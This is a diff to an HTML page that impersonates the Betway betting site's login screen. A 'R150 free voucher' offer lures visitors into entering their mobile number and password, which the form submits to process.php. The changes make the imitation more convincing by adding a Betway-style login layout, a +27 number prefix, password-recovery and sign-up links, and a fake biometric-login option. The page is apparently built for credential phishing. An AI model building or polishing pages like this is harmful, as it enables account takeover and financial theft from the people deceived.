@@ -3,18 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Betway Free Voucher Giveaway</title>
+    <title>Betway Free Voucher</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <div class="giveaway-container">
-        <h2>Betway Free Voucher Giveaway</h2>
-        <p>Enter your mobile number and password to claim your free voucher!</p>
-        <form action="process.php" method="post">
-            <input type="text" name="mobile" placeholder="Mobile Number" required>
-            <input type="password" name="password" placeholder="Password" required>
-            <button type="submit">Claim Your Voucher</button>
-        </form>
+    <div class="background-image">
+        <div class="login-container">
+            <h2>Betway Login</h2>
+            <p>Claim your R150 free voucher!</p>
+            <form action="process.php" method="post">
+                <div class="input-group">
+                    <label for="mobile">Mobile Number</label>
+                    <input type="text" id="mobile" name="mobile" placeholder="+27" required>
+                </div>
+                <div class="input-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" placeholder="Password" required>
+                </div>
+                <a href="#" class="forgot-password">Forgot Password?</a>
+                <p>Don't have an account yet? <a href="#" class="sign-up">Sign Up</a></p>
+                <button type="submit">Login</button>
+                <div class="biometric-login">
+                    <img src="https://via.placeholder.com/20" alt="Fingerprint">
+                    <span>Login using Biometrics</span>
+                </div>
+            </form>
+        </div>
     </div>
 </body>
 </html>
